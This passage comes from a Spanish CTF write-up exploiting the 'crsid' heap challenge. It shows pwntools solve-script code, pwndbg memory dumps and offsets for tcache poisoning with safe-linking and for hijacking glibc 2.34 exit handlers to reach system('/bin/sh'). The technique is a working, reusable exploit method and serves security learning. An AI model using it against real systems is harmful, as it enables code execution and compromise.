+    0x55691161f000     0x556911620000 r--p     1000 0      ./crsid
+<span class="code-dark-red">    0x556911620000     0x556911621000 r-xp     1000 1000   ./crsid</span>
+    0x556911621000     0x556911622000 r--p     1000 2000   ./crsid
+    0x556911622000     0x556911623000 r--p     1000 2000   ./crsid
+<span class="code-dark-magenta">    0x556911623000     0x556911624000 rw-p     1000 3000   ./crsid</span>
+<span class="code-dark-blue">    0x5569130e9000     0x55691310a000 rw-p    21000 0      [heap]</span>
+<span class="code-dark-magenta">    0x7f83f9b51000     0x7f83f9b54000 rw-p     3000 0      [anon_7f83f9b51]</span>
+    0x7f83f9b54000     0x7f83f9b80000 r--p    2c000 0      ./glibc/libc.so.6
+<span class="code-dark-red">    0x7f83f9b80000     0x7f83f9ce7000 r-xp   167000 2c000  ./glibc/libc.so.6</span>
+    0x7f83f9ce7000     0x7f83f9d3c000 r--p    55000 193000 ./glibc/libc.so.6
+    0x7f83f9d3c000     0x7f83f9d3d000 ---p     1000 1e8000 ./glibc/libc.so.6
+    0x7f83f9d3d000     0x7f83f9d40000 r--p     3000 1e8000 ./glibc/libc.so.6
+<span class="code-dark-magenta">    0x7f83f9d40000     0x7f83f9d43000 rw-p     3000 1eb000 ./glibc/libc.so.6</span>
+<span class="code-dark-magenta">    0x7f83f9d43000     0x7f83f9d52000 rw-p     f000 0      [anon_7f83f9d43]</span>
+    0x7f83f9d52000     0x7f83f9d53000 r--p     1000 0      ./glibc/ld-2.34.so  
+<span class="code-dark-red">    0x7f83f9d53000     0x7f83f9d77000 r-xp    24000 1000   ./glibc/ld-2.34.so</span>
+    0x7f83f9d77000     0x7f83f9d81000 r--p     a000 25000  ./glibc/ld-2.34.so
+    0x7f83f9d81000     0x7f83f9d83000 r--p     2000 2e000  ./glibc/ld-2.34.so
+<span class="code-dark-magenta">    0x7f83f9d83000     0x7f83f9d85000 rw-p     2000 30000  ./glibc/ld-2.34.so</span>
+<span class="code-dark-yellow">    0x7ffe2b384000     0x7ffe2b3a5000 rw-p    21000 0      [stack]</span>
+    0x7ffe2b3ea000     0x7ffe2b3ee000 r--p     4000 0      [vvar]
+<span class="code-dark-red">    0x7ffe2b3ee000     0x7ffe2b3f0000 r-xp     2000 0      [vdso]</span>
+<span class="code-dark-red">0xffffffffff600000 0xffffffffff601000 --xp     1000 0      [vsyscall]</span>
+</code></pre></div><p>De nuevo, todo parece correcto. Ahora tenemos todas las direcciones necesarias para continuar con la explotación.</p><h3 id="explotación-del-tcache">Explotación del Tcache</h3><p>Lo siguiente que tenemos que conseguir es el Tcache <em>poisoning</em>. Para ello, vamos a vaciar el Tcache:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">7</span><span class="mtk1">):</span>  
+<span class="mtk1">        </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)</span>
+</code></pre></div><p>Y ya tenemos el Tcache vacío y estos punteros en <code>users</code> y <code>crsid</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './crsid'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './crsid': pid 984349
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './crsid', '984349', '-x', '/tmp/pwnjz4wily7.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-green">+</span>] Heap base address: 0x555637f8e000
+[<span class="code-green">+</span>] Glibc base address: 0x7f5479945000
+[<span class="code-blue">*</span>] Switching to interactive mode
+A new username appeared!
+=========================
+[1] Create username
+[2] Delete username
+[3] Edit username
+[4] Show username
+[5] Change your CRSid
+[6] Exit
+=========================
+[#] <span class="code-red">$</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>Reading symbols from <span class="code-dark-green">./crsid</span>...
+(No debugging symbols found in <span class="code-dark-green">./crsid</span>)
+Attaching to program: ./crsid, process 984349
+Reading symbols from <span class="code-dark-green">./glibc/libc.so.6</span>...
+Reading symbols from <span class="code-dark-green">./glibc/ld-2.34.so</span>...
+<span class="code-dark-blue">0x00007f5479a3e5ce</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x555636f9c0c0, <span class="code-dark-cyan">nbytes</span>=32) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26
+26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+^C
+Program received signal SIGINT, Interrupt.
+<span class="code-dark-blue">0x00007f5479a3e5ce</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x7f5479b31b03 &lt;_IO_2_1_stdin_+131&gt;, <span class="code-dark-cyan">nbytes</span>=1) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26  
+26      in <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>bins
+<span class="code-dark-blue">tcachebins</span>
+<span class="code-dark-yellow">empty</span>
+<span class="code-dark-blue">fastbins</span>
+<span class="code-dark-yellow">0x20</span>: 0x0
+<span class="code-dark-yellow">0x30</span>: 0x0
+<span class="code-dark-yellow">0x40</span>: 0x0
+<span class="code-dark-yellow">0x50</span>: 0x0
+<span class="code-dark-yellow">0x60</span>: 0x0
+<span class="code-dark-yellow">0x70</span>: 0x0
+<span class="code-dark-yellow">0x80</span>: 0x0
+<span class="code-dark-blue">unsortedbin</span>
+<span class="code-dark-yellow">all</span>: 0x0
+<span class="code-dark-blue">smallbins</span>
+<span class="code-dark-yellow">empty</span>
+<span class="code-dark-blue">largebins</span>
+<span class="code-dark-yellow">empty</span>
+<span class="code-red">pwndbg&gt; </span>x/20gx &stderr
+<span class="code-dark-blue">0x555636f9c040</span> &lt;<span class="code-dark-yellow">stderr</span>&gt;:        0x00007f8fbb275680      0x0000000000000000  
+<span class="code-dark-blue">0x555636f9c050</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x555636f9c060</span>: 0x0000555637f8e2f0      0x0000555637f8e340
+<span class="code-dark-blue">0x555636f9c070</span>: 0x0000555637f8e390      0x0000555637f8e3e0
+<span class="code-dark-blue">0x555636f9c080</span>: 0x0000555637f8e430      0x0000555637f8e480
+<span class="code-dark-blue">0x555636f9c090</span>: 0x0000555637f8e4d0      0x0000555637f8e2a0
+<span class="code-dark-blue">0x555636f9c0a0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x555636f9c0b0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x555636f9c0c0</span>: 0x0000555637f8e2a0      0x0000000000000000
+<span class="code-dark-blue">0x555636f9c0d0</span>: 0x0000000000000000      0x0000000000000000
+</code></pre></div><p>Nótese que el índice <code>7</code> apunta al mismo <em>chunk</em> que el <code>crsid</code>. Por tanto, podemos liberarlo y modificar el puntero <code>fd</code> usando el índice <code>12</code> (<code>crsid</code>), que es una primitiva de <em>Write After Free</em>.</p><p>En otros retos de <em>heap</em>, en este punto pondríamos la dirección de <code>__malloc_hook</code> o <code>__free_hook</code> en el puntero <code>fd</code>, de manera que crearíamos un <em>chunk</em> ahí y podríamos añadir datos a los <em>hooks</em>. Desafortunadamente, Glibc 2.34 no utiliza <em>hooks</em> para prevenir este tipo de <em>exploits</em>.</p><h3 id="_exit-handlers_"><em>Exit handlers</em></h3><p>Por tanto, tenemos que encontrar otra técnica para conseguir ejecución de comandos. Realizando un poco de investigación sobre maneras de vulnerar Glibc 2.34, encontré <a href="https://ctftime.org/writeup/34804">Aero CTF 2022</a>. En este <em>write-up</em> se utiliza una técnica para introducir una función maliciosa en la lista <code>__exit_funcs</code>, de forma que al llamar a <code>exit</code>, el programa ejecuta la función maliciosa (por ejemplo, <code>system("/bin/sh")</code>). Más información <a href="https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html">aquí</a>.</p><p>Esta técnica requiere una fuga de memoria de la función de salida legítima. Esta dirección está cifrada con XOR y rotaciones de bits. Las siguientes funciones <code>lambda</code> (adaptadas del <em>write-up</em> anterior) son necesarias para descifrar la dirección real:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">rol</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">lambda</span><span class="mtk1"> </span><span class="mtk9 mtki">val</span><span class="mtk1">, </span><span class="mtk9 mtki">r_bits</span><span class="mtk1">, </span><span class="mtk9 mtki">max_bits</span><span class="mtk1">: \</span>
+<span class="mtk1">        (</span><span class="mtk9 mtki">val</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> </span><span class="mtk9 mtki">r_bits</span><span class="mtk1"> </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk9 mtki">max_bits</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1"> (</span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1"> </span><span class="mtk9 mtki">max_bits</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) </span><span class="mtk5">|</span><span class="mtk1"> \</span>
+<span class="mtk1">        ((</span><span class="mtk9 mtki">val</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1"> (</span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1"> </span><span class="mtk9 mtki">max_bits</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)) </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> (</span><span class="mtk9 mtki">max_bits</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> (</span><span class="mtk9 mtki">r_bits</span><span class="mtk1"> </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk9 mtki">max_bits</span><span class="mtk1">)))</span>  
+
+<span class="mtk1">    </span><span class="mtk1">ror</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">lambda</span><span class="mtk1"> </span><span class="mtk9 mtki">val</span><span class="mtk1">, </span><span class="mtk9 mtki">r_bits</span><span class="mtk1">, </span><span class="mtk9 mtki">max_bits</span><span class="mtk1">: \</span>
+<span class="mtk1">        ((</span><span class="mtk9 mtki">val</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk1"> (</span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1"> </span><span class="mtk9 mtki">max_bits</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)) </span><span class="mtk5">&gt;&gt;</span><span class="mtk1"> </span><span class="mtk9 mtki">r_bits</span><span class="mtk1"> </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk9 mtki">max_bits</span><span class="mtk1">) </span><span class="mtk5">|</span><span class="mtk1"> \</span>
+<span class="mtk1">        (</span><span class="mtk9 mtki">val</span><span class="mtk1"> </span><span class="mtk5">&lt;&lt;</span><span class="mtk1"> (</span><span class="mtk9 mtki">max_bits</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> (</span><span class="mtk9 mtki">r_bits</span><span class="mtk1"> </span><span class="mtk5">%</span><span class="mtk1"> </span><span class="mtk9 mtki">max_bits</span><span class="mtk1">)) </span><span class="mtk5">&amp;</span><span class="mtk1"> (</span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk1"> </span><span class="mtk9 mtki">max_bits</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">))</span>
+
+<span class="mtk1">    </span><span class="mtk1">encrypt</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">lambda</span><span class="mtk1"> </span><span class="mtk9 mtki">value</span><span class="mtk1">, </span><span class="mtk9 mtki">key</span><span class="mtk1">: </span><span class="mtk1">rol</span><span class="mtk1">(</span><span class="mtk9 mtki">value</span><span class="mtk1"> </span><span class="mtk5">^</span><span class="mtk1"> </span><span class="mtk9 mtki">key</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">11</span><span class="mtk1">, </span><span class="mtk6">64</span><span class="mtk1">)</span>
+</code></pre></div><p>Estas son las direcciones relevantes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/gx &__exit_funcs
+<span class="code-dark-blue">0x7f5479b31818</span> &lt;<span class="code-dark-yellow">__exit_funcs</span>&gt;:  0x00007f5479b33bc0
+<span class="code-red">pwndbg&gt; </span>x/10gx 0x00007f5479b33bc0
+<span class="code-dark-blue">0x7f5479b33bc0</span> &lt;<span class="code-dark-yellow">initial</span>&gt;:       0x0000000000000000      0x0000000000000001  
+<span class="code-dark-blue">0x7f5479b33bd0</span> &lt;<span class="code-dark-yellow">initial</span>+16&gt;:    0x0000000000000004      0xbf6103b40d295794
+<span class="code-dark-blue">0x7f5479b33be0</span> &lt;<span class="code-dark-yellow">initial</span>+32&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f5479b33bf0</span> &lt;<span class="code-dark-yellow">initial</span>+48&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7f5479b33c00</span> &lt;<span class="code-dark-yellow">initial</span>+64&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-red">pwndbg&gt; </span>p initial
+$1 = {
+  next = <span class="code-dark-blue">0x0</span>,
+  idx = 1,
+  fns = {{
+      flavor = 4,
+      func = {
+        at = <span class="code-dark-blue">0xbf6103b40d295794</span>,
+        on = {
+          fn = <span class="code-dark-blue">0xbf6103b40d295794</span>,
+          arg = <span class="code-dark-blue">0x0</span>
+        },
+        cxa = {
+          fn = <span class="code-dark-blue">0xbf6103b40d295794</span>,
+          arg = <span class="code-dark-blue">0x0</span>,
+          dso_handle = <span class="code-dark-blue">0x0</span>
+        }
+      }
+    }, {
+      flavor = 0,
+      func = {
+        at = <span class="code-dark-blue">0x0</span>,
+        on = {
+          fn = <span class="code-dark-blue">0x0</span>,
+          arg = <span class="code-dark-blue">0x0</span>
+        },
+        cxa = {
+          fn = <span class="code-dark-blue">0x0</span>,
+          arg = <span class="code-dark-blue">0x0</span>,
+          dso_handle = <span class="code-dark-blue">0x0</span>
+        }
+      }
+    } <span class="code-grey">&lt;repeats 31 times&gt;</span>}
+}
+</code></pre></div><p>Podemos obtener los <em>offsets</em> de estas direcciones:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; hex(0x7f5479b31818 - 0x7f5479945000)
+'0x1ec818'
+&gt;&gt;&gt; hex(0x00007f5479b33bc0 - 0x7f5479945000)  
+'0x1eebc0'
+</code></pre></div><p>Y el <em>exit handler</em> que se llama legítimamente es <code>_dl_fini</code> (cifrado como <code>0xbf6103b40d295794</code>), cuya dirección real puede verse una vez que se llama, porque no se publica hasta el proceso de salida:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './crsid'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './crsid': pid 1002383
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './crsid', '1002383', '-x', '/tmp/pwnw5eak7gl.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-green">+</span>] Heap base address: 0x555c0fed2000
+[<span class="code-green">+</span>] Glibc base address: 0x7f3e4a692000
+[<span class="code-blue">*</span>] Switching to interactive mode
+A new username appeared!
+=========================
+[1] Create username
+[2] Delete username
+[3] Edit username
+[4] Show username
+[5] Change your CRSid
+[6] Exit
+=========================
+[#] <span class="code-red">$</span> 6
+[<span class="code-blue">*</span>] Got EOF while reading in interactive
+<span class="code-red">$</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>Reading symbols from <span class="code-dark-green">./crsid</span>...
+(No debugging symbols found in <span class="code-dark-green">./crsid</span>)
+Attaching to program: ./crsid, process 1002383
+Reading symbols from <span class="code-dark-green">./glibc/libc.so.6</span>...
+Reading symbols from <span class="code-dark-green">./glibc/ld-2.34.so</span>...
+<span class="code-dark-blue">0x00007f3e4a78b5ce</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x555c0fa860c0, <span class="code-dark-cyan">nbytes</span>=32) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26  
+26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+[Inferior 1 (process 1002383) exited normally]
+<span class="code-red">pwndbg&gt; </span>p _dl_fini
+$1 = {void (void)} <span class="code-dark-blue">0x7f3e4a8a0350</span> &lt;<span class="code-dark-yellow">_dl_fini</span>&gt;
+</code></pre></div><p>Y este es el <em>offset</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; hex(0x7f3e4a8a0350 - 0x7f3e4a692000)  
+'0x20e350'
+</code></pre></div><p>Una vez que tenemos estas direcciones, necesitamos fugar la función de salida original (cifrada) para obtener la clave de cifrado. Esto se puede hacer mediante Tcache <em>poisoning</em>. Nótese que el nuevo puntero <code>fd</code> tiene que estar ofuscado debido a <em>safe-linking</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">__exit_funcs</span><span class="mtk1">      </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1ec818</span>
+<span class="mtk1">    </span><span class="mtk1">exit_handler_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1eebc0</span>
+<span class="mtk1">    </span><span class="mtk1">_dl_fini</span><span class="mtk1">          </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">20e350</span>
+
+<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'__exit_funcs address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">__exit_funcs</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Original exit handler address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">exit_handler_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>  
+<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'_dl_fini address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">_dl_fini</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">7</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">12</span><span class="mtk1">, p64(</span><span class="mtk8">obfuscate</span><span class="mtk1">(</span><span class="mtk1">exit_handler_addr</span><span class="mtk1">, </span><span class="mtk1">heap_base_addr</span><span class="mtk1">)))</span>
+
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">7</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">24</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">encrypted_function</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk8">show</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">7</span><span class="mtk1">)[</span><span class="mtk6">24</span><span class="mtk1">:])</span>
+
+<span class="mtk1">    </span><span class="mtk1">key</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">ror</span><span class="mtk1">(</span><span class="mtk1">encrypted_function</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">11</span><span class="mtk1">, </span><span class="mtk6">64</span><span class="mtk1">) </span><span class="mtk5">^</span><span class="mtk1"> </span><span class="mtk1">_dl_fini</span>
+
+<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Encrypted function: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">encrypted_function</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Encryption key: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">key</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Sanity check: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">encrypt</span><span class="mtk1">(</span><span class="mtk1">_dl_fini</span><span class="mtk1">, </span><span class="mtk1">key</span><span class="mtk1">))</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+</code></pre></div><p>Para la fuga de memoria, necesitamos editar el <em>exit handler</em> <code>initial</code> para sobrescribirlo los bytes nulos y poder fugar la función <code>_dl_fini</code>. Como comprobación, podemos cifrarla de nuevo con la misma clave de cifrado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './crsid'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
+[<span class="code-green">+</span>] Starting local process './crsid': pid 1010243
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './crsid', '1010243', '-x', '/tmp/pwnh755srzo.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-green">+</span>] Heap base address: 0x55baf8a08000
+[<span class="code-green">+</span>] Glibc base address: 0x7fb3cbbdd000
+[<span class="code-blue">*</span>] __exit_funcs address: 0x7fb3cbdc9818
+[<span class="code-blue">*</span>] Original exit handler address: 0x7fb3cbdcbbc0
+[<span class="code-blue">*</span>] _dl_fini address: 0x7fb3cbdeb350
+[<span class="code-blue">*</span>] Encrypted function: 0xf1d7f8de6d77d8cd
+[<span class="code-blue">*</span>] Encryption key: 0xec66875837b185eb
+[<span class="code-blue">*</span>] Sanity check: 0xf1d7f8de6d77d8cd
+[<span class="code-blue">*</span>] Switching to interactive mode
+=========================
+[1] Create username
+[2] Delete username
+[3] Edit username
+[4] Show username
+[5] Change your CRSid
+[6] Exit
+=========================
+[#] <span class="code-red">$</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"></span>Reading symbols from <span class="code-dark-green">./crsid</span>...
+(No debugging symbols found in <span class="code-dark-green">./crsid</span>)
+Attaching to program: ./crsid, process 1010243
+Reading symbols from <span class="code-dark-green">./glibc/libc.so.6</span>...
+Reading symbols from <span class="code-dark-green">./glibc/ld-2.34.so</span>...
+<span class="code-dark-blue">0x00007fb3cbcd65ce</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x55baf6eb40c0, <span class="code-dark-cyan">nbytes</span>=32) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26
+26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+^C
+Program received signal SIGINT, Interrupt.
+<span class="code-dark-blue">0x00007fb3cbcd65ce</span> in <span class="code-dark-yellow">__GI___libc_read</span> (<span class="code-dark-cyan">fd</span>=0, <span class="code-dark-cyan">buf</span>=0x7fb3cbdc9b03 &lt;_IO_2_1_stdin_+131&gt;, <span class="code-dark-cyan">nbytes</span>=1) at <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>:26  
+26      in <span class="code-dark-green">../sysdeps/unix/sysv/linux/read.c</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/6gx &initial
+<span class="code-dark-blue">0x7fb3cbdcbbc0</span> &lt;<span class="code-dark-yellow">initial</span>&gt;:       0x4141414141414141      0x4141414141414141  
+<span class="code-dark-blue">0x7fb3cbdcbbd0</span> &lt;<span class="code-dark-yellow">initial</span>+16&gt;:    0x4141414141414141      0xf1d7f8de6d77d8cd
+<span class="code-dark-blue">0x7fb3cbdcbbe0</span> &lt;<span class="code-dark-yellow">initial</span>+32&gt;:    0x0000000000000000      0x0000000000000000
